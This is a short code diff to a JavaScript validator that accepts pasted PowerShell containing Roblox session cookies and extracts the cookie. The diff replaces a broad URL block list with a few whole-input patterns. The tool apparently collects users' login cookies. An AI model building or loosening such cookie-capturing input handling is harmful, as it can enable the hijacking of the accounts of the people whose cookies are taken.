@@ -96,28 +96,12 @@ function isValidCode(code) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // SECOND: Block URLs only if it's NOT PowerShell code with cookies
+    // SECOND: Block only very obvious standalone URLs (minimal blocking)
     const urlPatterns = [
-        // Clear protocol patterns
-        /https?:\/\//i,     // http:// or https://
-        /ftp:\/\//i,        // ftp://
-        
-        // Obvious web patterns
-        /www\./i,           // www.
-        
-        // Major domains only
-        /\w+\.(com|net|org|gov)/i,
-        
-        // Popular services
-        /discord\.gg/i,     // discord.gg
-        /bit\.ly/i,         // bit.ly
-        /youtu\.be/i,       // youtu.be
-        /github\.com/i,     // github.com
-        /pastebin\.com/i,   // pastebin.com
-        
-        // Clear URL indicators
-        /\/\//i,            // double slash
-        /[\?\&]\w+=\w+/i,   // query parameters
+        // Only block very obvious standalone links
+        /^https?:\/\/[^\s]+$/i,     // Full URLs that are the entire input
+        /^www\.[^\s]+$/i,           // www.something as entire input
+        /^discord\.gg\/[^\s]+$/i,   // discord.gg links as entire input
     ];
 
     // Check both original and preprocessed text for URL patterns
